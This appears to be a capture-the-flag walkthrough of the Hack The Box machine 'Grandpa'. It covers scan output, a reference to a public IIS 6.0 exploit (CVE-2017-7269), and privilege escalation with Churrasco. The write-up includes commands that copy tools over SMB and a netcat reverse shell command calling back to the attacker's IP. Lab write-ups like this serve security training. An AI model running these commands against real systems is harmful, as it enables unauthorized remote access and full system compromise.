# Grandpa - Windows, easy (10.10.10.14)

### Enumeration
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Fri, 09 Sep 2022 19:55:42 GMT
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can see that this is Microsoft IIS version 6.0 and it allows for a lot of options for the request parameter, so maybe we can upload a file.
We can test this with `davtest`:
```
root@kali# davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: NHwzc9ANv
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     html    FAIL
PUT     php     FAIL
PUT     txt     FAIL
PUT     jsp     FAIL
PUT     cfm     FAIL
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     jhtml   FAIL
PUT     pl      FAIL
```

Unfortunately, we can't use PUT to upload a file.

Googling `IIS 6.0 exploit` we can notice a [script](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell) related to `CVE-2017-7269`.

Using it we can obtain a shell as user NETWORK SERVICE!

### From Network Service to System
We can check the privileges on the box using `whoami /priv`:
```

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

`SeImpersonatePrivilege` allows us to impersonate a client, we can try to exploit this using [Churrasco](https://github.com/Re4son/Churrasco/).
Downlaod the binary and in the same folder copy `nc.exe` (`cp /usr/share/windows-binaries/nc.exe`) and run `smbserver.py share .`.
In this way we can get the two binaries on the box!
Before this, we need to find a directory in which we have write permissions, trying the folders in `C:\`, we can notice that `wmpub` is writeable by all the users (WD):
```
C:\>icacls wmpub
wmpub BUILTIN\Administrators:(F)
      BUILTIN\Administrators:(I)(OI)(CI)(F)
      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
      BUILTIN\Users:(I)(OI)(CI)(RX)
      BUILTIN\Users:(I)(CI)(AD)
      BUILTIN\Users:(I)(CI)(WD)
```

Now copy the binaries on the box:
```
C:\wmpub> copy \\10.10.14.13\share\nc.exe .
C:\wmpub> copy \\10.10.14.13\share\churrasco.exe .
```

Now run it, setting up a netcat listener on our machine:
```
C:\wmpub> .\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.13 443"
```

Now you can get both flags in Administrator and Harry folders!
